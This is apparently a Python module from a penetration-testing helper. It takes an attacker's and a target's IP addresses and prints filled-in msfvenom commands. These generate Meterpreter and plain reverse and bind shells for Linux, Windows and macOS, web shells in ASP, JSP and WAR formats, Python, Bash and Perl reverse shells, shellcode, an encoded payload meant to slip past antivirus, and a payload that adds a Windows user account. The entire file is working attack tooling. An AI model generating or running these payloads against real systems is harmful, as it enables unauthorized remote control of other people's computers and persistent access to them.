from src.design import print_error, print_info, print_msfvenom_shells, print_shell_types, bcolors, print_msfvenom_shells
import os

def msfvenom_shells(lhost, lport):
	print_info("Some shells require the REMOTE HOST IP")
	rhost = input("Enter the REMOTE HOST (target) IP address: ")
	os.system("clear")
	print("")
	print_info("REVERSE SHELLS")
	
	print_shell_types("Linux Meterpreter Reverse Shell")
	print_msfvenom_shells("""msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="""+lhost+""" LPORT="""+lport+""" -f elf > shell.elf""")

	print_shell_types("Linux Bind Meterpreter Shell")
	print_msfvenom_shells("""msfvenom -p linux/x86/meterpreter/bind_tcp RHOST="""+rhost+""" LPORT="""+lport+""" -f elf > bind.elf""")

	print_shell_types("Linux Bind Shell")
	print_msfvenom_shells("""msfvenom -p generic/shell_bind_tcp RHOST="""+rhost+""" LPORT="""+lport+""" -f elf > term.elf""")

	print_shell_types("Windows Meterpreter Reverse TCP Shell")
	print_msfvenom_shells("""msfvenom -p windows/meterpreter/reverse_tcp LHOST="""+lhost+""" LPORT="""+lport+""" -f exe > shell.exe""")

	print_shell_types("Windows Reverse TCP Shell")
	print_msfvenom_shells("""msfvenom -p windows/shell/reverse_tcp LHOST="""+lhost+""" LPORT="""+lport+""" -f exe > shell.exe""")

	print_shell_types("Windows Encoded Meterpreter Windows Reverse Shell")
	print_msfvenom_shells("""msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe""")

	print_shell_types("Mac Reverse Shell")
	print_msfvenom_shells("""msfvenom -p osx/x86/shell_reverse_tcp LHOST="""+lhost+""" LPORT="""+lport+""" -f macho > shell.macho""")

	print_shell_types("Mac Bind Shell")
	print_msfvenom_shells("""msfvenom -p osx/x86/shell_bind_tcp RHOST="""+rhost+""" LPORT="""+lport+""" -f macho > bind.macho""")

	print("")
	print_info("WEB PAYLOADS")

	# THE ONE BELOW ISN'T PRINTING PROPERLY AND I AM NOT SURE WHAT IT ACTUALLY DOES
	#print_shell_types("PHP Meterpreter Reverse TCP")
	#print_msfvenom_shells("""msfvenom -p php/meterpreter_reverse_tcp LHOST="""+lhost+""" LPORT="""+lport+"""f raw > shell.php""")
	#print_msfvenom_shells("""cat shell.php | pbcopy && echo ‘<?php ‘ | tr -d ‘\\n’ > shell.php && pbpaste >> shell.php""")

	print_shell_types("ASP Meterpreter Reverse TCP")
	print_msfvenom_shells("""msfvenom -p windows/meterpreter/reverse_tcp LHOST="""+lhost+""" LPORT="""+lport+""" -f asp > shell.asp""")

	print_shell_types("JSP Java Meterpreter Reverse TCP")
	print_msfvenom_shells("""msfvenom -p java/jsp_shell_reverse_tcp LHOST="""+lhost+""" LPORT="""+lport+""" -f raw > shell.jsp""")

	print_shell_types("WAR")
	print_msfvenom_shells("""msfvenom -p java/jsp_shell_reverse_tcp LHOST="""+lhost+""" LPORT="""+lport+""" -f war > shell.war""")

	print("")
	print_info("SCRIPTING PAYLOADS")

	print_shell_types("Python Reverse Shell")
	print_msfvenom_shells("""msfvenom -p cmd/unix/reverse_python LHOST="""+lhost+""" LPORT="""+lport+""" -f raw > shell.py""")

	print_shell_types("Bash Unix Reverse Shell")
	print_msfvenom_shells("""msfvenom -p cmd/unix/reverse_bash LHOST="""+lhost+""" LPORT="""+lport+""" -f raw > shell.sh""")

	print_shell_types("Perl Unix Reverse shell")
	print_msfvenom_shells("""msfvenom -p cmd/unix/reverse_perl LHOST="""+lhost+""" LPORT="""+lport+""" -f raw > shell.pl""")

	print("")
	print_info("SHELLCODES")

	print_shell_types("Windows Meterpreter Reverse TCP Shellcode")
	print_msfvenom_shells("""msfvenom -p windows/meterpreter/reverse_tcp LHOST="""+lhost+""" LPORT="""+lport+""" -f <language>""")

	print_shell_types("Linux Meterpreter Reverse TCP Shellcode")
	print_msfvenom_shells("""msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="""+lhost+""" LPORT="""+lport+""" -f <language>""")

	print_shell_types("Mac Reverse TCP Shellcode")
	print_msfvenom_shells("""msfvenom -p osx/x86/shell_reverse_tcp LHOST="""+lhost+""" LPORT="""+lport+""" -f <language>""")

	print_shell_types("Create User")
	print_info("You can change the username and password after")
	print_msfvenom_shells("""msfvenom -p windows/adduser USER=notadmin PASS=Sup3rS3cretP4ssw0rd -f exe > adduser.exe""")
